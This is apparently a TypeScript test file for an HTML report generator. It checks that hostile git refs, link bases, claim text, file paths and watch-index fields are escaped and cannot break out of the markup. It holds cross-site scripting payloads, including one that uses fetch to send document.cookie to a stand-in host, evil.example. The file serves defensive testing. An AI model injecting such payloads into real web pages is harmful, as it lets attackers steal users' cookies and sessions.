// SPDX-License-Identifier: GPL-3.0-or-later
import { test } from "node:test";
import assert from "node:assert/strict";
import { toHtml } from "../src/html.ts";
import { toWatchIndexHtml } from "../src/watch.ts";
import type { ClaimResult, Report } from "../src/types.ts";

// `git check-ref-format refs/tags/<this>` returns 0, and the GitHub release
// API hands the tag straight to us as headRef.
const HOSTILE = `v1.0"><img/src=x/onerror=fetch('//evil.example/'+document.cookie)>`;

function report(over: Partial<Report> = {}): Report {
  return {
    repoLabel: "victim/app",
    baseRef: "v0.9.0",
    headRef: "v1.0.0",
    stats: { commits: 1, files: 1, additions: 1, deletions: 0 },
    results: [],
    uncovered: [],
    reverseChecked: true,
    metrics: {
      scores: { correctness: 100, completeness: 100, risk: 100, overall: 100, label: "solid" },
      flags: [],
      files: [{ path: "src/a.ts", churn: 10, sensitive: null, coverage: "evidence" }],
      churnCoveredRatio: 1,
      context: { languages: null, codeBytes: null, releaseCadenceDays: null },
      baseline: null,
      unverifiable: null,
    },
    warnings: [],
    truncated: false,
    engine: "off",
    linkBase: "https://github.com/victim/app",
    ...over,
  };
}

/** No `<` from a payload may sit outside a tag we wrote, and no attribute
 * value may be closed by one. Both checks over the raw document. */
function assertNoBreakout(html: string, marker = "img/src=x"): void {
  assert.ok(!html.includes(`<${marker}`), "payload became an element");
  assert.ok(
    !/<a href="[^"]*"><img/.test(html) && !/<a href="[^"]*"\s+on\w+=/.test(html),
    "payload escaped an href attribute",
  );
}

test("a hostile head ref cannot break out of the treemap link", () => {
  const html = toHtml(report({ headRef: HOSTILE }));
  assertNoBreakout(html);
  assert.ok(html.includes("%3E") || html.includes("&quot;"), "the ref is encoded, not dropped");
});

test("a hostile base ref cannot break out either", () => {
  assertNoBreakout(toHtml(report({ baseRef: HOSTILE })));
});

test("a hostile link base cannot break out of commit links", () => {
  const result: ClaimResult = {
    claim: {
      id: 0, section: "Security", text: "Fix the thing", kind: "change",
      prNumbers: [], shas: [], advisories: [], codeSpans: [],
    },
    verdict: "no-evidence",
    confidence: 0.5,
    evidence: { commitShas: ["abc123def456"], files: [], matchedTerms: [], methods: ["none"] },
    reasoning: "nothing found",
    judged: false,
    generated: false,
  };
  const html = toHtml(
    report({
      linkBase: `https://github.com/x"><img/src=x/onerror=alert(1)>`,
      results: [result],
      uncovered: [
        {
          commit: { sha: "abc123def456", subject: "chore", body: "", author: "m", prNumbers: [] },
          additions: 1, deletions: 0, fileCount: 1,
        },
      ],
      metrics: {
        ...report().metrics,
        flags: [{ severity: "critical", kind: "opaque-change", message: "binary", files: [], commitShas: ["abc123def456"] }],
      },
    }),
  );
  assertNoBreakout(html);
});

test("hostile claim text, file paths and reasoning stay text", () => {
  const html = toHtml(
    report({
      results: [
        {
          claim: {
            id: 0, section: `<script>alert('section')</script>`,
            text: `<script>alert('claim')</script>`, kind: "change",
            prNumbers: [], shas: [], advisories: [], codeSpans: [],
          },
          verdict: "no-evidence",
          confidence: 0.5,
          evidence: {
            commitShas: [], files: [`src/<script>alert('path')</script>.ts`],
            matchedTerms: [], methods: ["none"],
          },
          reasoning: `<script>alert('reason')</script>`,
          judged: false,
          generated: false,
        },
      ],
    }),
  );
  assert.ok(!html.includes("<script>alert("), "no payload became a script element");
  assert.ok(html.includes("&lt;script&gt;"), "it is rendered as text instead");
});

test("the watch index escapes a hostile tag, label and report path", () => {
  const html = toWatchIndexHtml(
    {
      version: 1,
      repos: {
        [`x"><img/src=x/onerror=alert(1)>`]: {
          lastPublishedAt: "2026-01-01T00:00:00Z",
          lastTag: HOSTILE,
          history: [],
          latest: {
            tag: HOSTILE,
            publishedAt: "2026-01-01T00:00:00Z",
            checkedAt: "2026-01-02T00:00:00Z",
            score: 10,
            scoreLabel: `suspicious"><img/src=x>`,
            exitCode: 1,
            criticalFlags: 1,
            flagCount: 2,
            flagged: true,
            engine: `off"><img/src=x>`,
            verdicts: { verified: 0, partial: 0, noEvidence: 1, contradicted: 1 },
            report: `x"><img/src=x/onerror=alert(1)>/v1.html`,
          },
        },
      },
    },
    "2026-01-02T00:00:00Z",
  );
  assertNoBreakout(html);
  assert.ok(!html.includes("<img/src=x"), "no payload became an element anywhere");
});
